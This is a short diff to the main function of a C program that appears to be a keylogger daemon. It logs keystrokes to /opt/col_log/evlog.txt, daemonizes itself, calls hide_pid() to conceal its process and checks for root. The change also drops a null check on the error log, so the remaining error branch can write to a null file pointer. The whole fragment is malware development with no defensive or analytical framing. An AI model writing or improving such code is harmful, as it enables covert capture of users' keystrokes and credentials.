@@ -172,20 +172,14 @@ int main(void) {
 	time_t curtime;
 	time(&curtime);										/* set the current time */
 
+	daemonize();
 	setup_dirs();
-
-	error_log = fopen("./col_log/log.txt", "a+"); 						/* daemon log */
-	if (NULL == error_log) {
-                fprintf(error_log, "ERROR: error_log couldn't be opened -- %s", ctime(&curtime));
-                exit(1);
-        }	
-
-        evlog = fopen("./col_log/evlog.txt", "a+");		 				/* key log */
+	error_log = fopen("/opt/col_log/log.txt", "a+"); 						/* daemon log */
+        evlog = fopen("/opt/col_log/evlog.txt", "a+");		 				/* key log */
 	if (NULL == evlog) {
                 fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
                 exit(1);
         }	
-	daemonize();
 	hide_pid();
 	is_root();
 
